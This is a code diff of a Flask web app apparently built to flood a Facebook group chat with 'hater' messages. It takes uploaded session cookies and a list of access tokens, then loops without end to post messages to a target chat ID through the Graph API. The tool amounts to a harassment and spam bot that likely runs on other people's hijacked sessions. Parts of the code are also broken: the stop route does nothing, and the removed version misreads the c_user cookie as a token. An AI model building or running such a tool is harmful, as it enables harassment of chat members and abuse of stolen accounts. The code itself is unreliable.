@@ -2,6 +2,7 @@ from flask import Flask, request, render_template, redirect, url_for
 import os
 import time
 import requests
+import json
 
 app = Flask(__name__)
 
@@ -16,147 +17,144 @@ headers = {
     'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
 }
 
-
 @app.route('/')
 def index():
     return '''
-        <html lang="en">
-<head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Message Sender</title>
-    <style>
-        body{
-            background-color: #f0f0f0;
-            font-family: Arial, sans-serif;
-        }
-        .container {
-            max-width: 700px;
-            margin: 0 auto;
-            padding: 20px;
-            background-color: #fff;
-            border-radius: 10px;
-            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
-        }
-        label {
-            font-size: 14px;
-            font-weight: bold;
-            margin-bottom: 8px;
-            display: block;
-        }
-        input[type="text"], input[type="file"], input[type="number"] {
-            width: 100%;
-            padding: 10px;
-            margin-bottom: 10px;
-            border-radius: 5px;
-            border: 1px solid #ddd;
-        }
-        .btn-submit {
-            background-color: #4CAF50;
-            color: white;
-            padding: 12px 20px;
-            border: none;
-            border-radius: 10px;
-            cursor: pointer;
-            display: block;
-            width: 100%;
-            margin-top: 10px;
-        }
-        .btn-submit:hover {
-            background-color: #45a049;
-        }
-        h2 {
-            text-align: center;
-            font-size: 18px;
-            margin-bottom: 20px;
-        }
-    </style>
-</head>
-<body>
-
-<div class="container">
-    <h2>Send Message via Facebook</h2>
-    <form action="/" method="post" enctype="multipart/form-data">
-        <label for="cookie">Select Facebook Cookie File:</label>
-        <input type="file" id="cookie" name="cookie" accept=".txt" required>
-        
-        <label for="target">Target Group Chat or Inbox ID:</label>
-        <input type="text" id="target" name="target" placeholder="Enter Target Group Chat ID or Inbox ID" required>
-        
-        <label for="hatersName">Enter Hater Name:</label>
-        <input type="text" id="hatersName" name="hatersName" placeholder="Enter Hater's Name" required>
-        
-        <label for="delay">Delay Between Messages (in seconds):</label>
-        <input type="number" id="delay" name="delay" value="10" required>
-        
-        <button type="submit" class="btn-submit">Send Messages</button>
-    </form>
-</div>
-
-</body>
-</html>
+    <html lang="en">
+        <head>
+            <meta charset="utf-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Facebook Automation</title>
+            <style>
+                body {
+                    background-color: rgb(0, 0, 0);
+                    color: white;
+                    font-family: Arial, sans-serif;
+                }
+                .container {
+                    max-width: 800px;
+                    margin: auto;
+                    padding: 20px;
+                    background: rgba(0, 0, 0, 0.7);
+                    border-radius: 10px;
+                    box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
+                }
+                h1 {
+                    text-align: center;
+                    color: white;
+                    font-size: 32px;
+                }
+                .form-group {
+                    margin-bottom: 20px;
+                }
+                .form-control {
+                    width: 100%;
+                    padding: 10px;
+                    border-radius: 5px;
+                    border: 1px solid #ccc;
+                }
+                .btn {
+                    padding: 10px 20px;
+                    background-color: rgb(0, 255, 0);
+                    border: none;
+                    border-radius: 5px;
+                    cursor: pointer;
+                }
+                .btn:hover {
+                    background-color: red;
+                }
+                .stop-btn {
+                    background-color: rgb(255, 0, 0);
+                    margin-top: 10px;
+                }
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <h1>Facebook Automation</h1>
+                <form action="/start" method="POST" enctype="multipart/form-data">
+                    <div class="form-group">
+                        <label for="cookiesFile">Select Cookie File:</label>
+                        <input type="file" class="form-control" id="cookiesFile" name="cookiesFile" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="txtFile">Select Tokens Text File:</label>
+                        <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="targetGroupId">Target Group Chat ID:</label>
+                        <input type="text" class="form-control" id="targetGroupId" name="targetGroupId" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="hatersName">Enter Haters Name:</label>
+                        <input type="text" class="form-control" id="hatersName" name="hatersName" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="delay">Delay in Seconds:</label>
+                        <input type="number" class="form-control" id="delay" name="delay" value="60" required>
+                    </div>
+                    <button type="submit" class="btn">Start Automation</button>
+                </form>
+                <form action="/stop" method="POST">
+                    <button type="submit" class="btn stop-btn">Stop Automation</button>
+                </form>
+            </div>
+        </body>
+    </html>
     '''
 
+@app.route('/start', methods=['POST'])
+def start_automation():
+    # Extract form data
+    cookies_file = request.files['cookiesFile']
+    tokens_file = request.files['txtFile']
+    target_group_id = request.form['targetGroupId']
+    haters_name = request.form['hatersName']
+    delay = int(request.form['delay'])
 
-@app.route('/', methods=['POST'])
-def send_message():
-    if request.method == 'POST':
-        # Retrieve the form data
-        cookie_file = request.files['cookie']
-        target = request.form['target']
-        haters_name = request.form['hatersName']
-        delay = int(request.form['delay'])
+    cookies = cookies_file.read().decode()  # Handle cookies for Facebook login
+    tokens = tokens_file.read().decode().splitlines()
 
-        # Save the cookie.txt file to the server for later use
-        cookie_path = 'cookie.txt'
-        cookie_file.save(cookie_path)
+    # Create a folder for the session
+    session_folder = f"session_{target_group_id}"
+    os.makedirs(session_folder, exist_ok=True)
 
-        # Read cookies from the cookie.txt file
-        with open(cookie_path, 'r') as file:
-            cookies = file.read().splitlines()
+    # Save the cookies and tokens
+    with open(os.path.join(session_folder, 'cookies.txt'), 'w') as f:
+        f.write(cookies)
 
-        # Set the Facebook token from the cookies file
-        access_token = None
-        for cookie in cookies:
-            if 'c_user' in cookie:
-                # Extract the token from the cookie or set it manually
-                # For simplicity, we assume the token is within the cookie
-                access_token = cookie.split('=')[1]
-                break
+    with open(os.path.join(session_folder, 'tokens.txt'), 'w') as f:
+        f.write("\n".join(tokens))
 
-        if not access_token:
-            return "Error: No valid access token found in cookie file."
+    # Placeholder for starting the automation
+    print(f"Automation started for target group {target_group_id} with delay {delay} seconds.")
+    
+    # Simulating sending messages (in a loop)
+    while True:
+        for token in tokens:
+            # Simulate a message send
+            message = f"{haters_name} sending automated message!"
+            payload = {'access_token': token, 'message': message}
 
-        # Prepare the Facebook Graph API URL
-        post_url = f'https://graph.facebook.com/v15.0/{target}/messages'
+            # Here, use the Facebook API to send the message to the group (simplified)
+            url = f"https://graph.facebook.com/v15.0/{target_group_id}/messages"
+            response = requests.post(url, json=payload, headers=headers)
+            
+            if response.status_code == 200:
+                print(f"Message sent successfully: {message}")
+            else:
+                print(f"Failed to send message: {message}")
+            
+            time.sleep(delay)
 
-        # Loop through and send messages
-        try:
-            for i in range(10):  # Limit to 10 messages for this example
-                message = f"{haters_name} {i+1} - Your message here."
-                params = {
-                    'access_token': access_token,
-                    'message': message
-                }
+    return redirect(url_for('index'))  # Redirect to the index page
 
-                # Send message via Facebook API
-                response = requests.post(post_url, params=params, headers=headers)
-                if response.status_code == 200:
-                    print(f"Message {i+1} sent successfully!")
-                else:
-                    print(f"Failed to send message {i+1}: {response.text}")
-
-                # Wait before sending the next message
-                time.sleep(delay)
-
-            return redirect(url_for('index'))
-
-        except Exception as e:
-            return f"An error occurred: {e}"
-
-    return redirect(url_for('index'))
-
+@app.route('/stop', methods=['POST'])
+def stop_automation():
+    # Logic to stop the automation (e.g., setting a flag or killing the process)
+    print("Automation stopped.")
+    return redirect(url_for('index'))  # Redirect to the index page
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
-    
+            
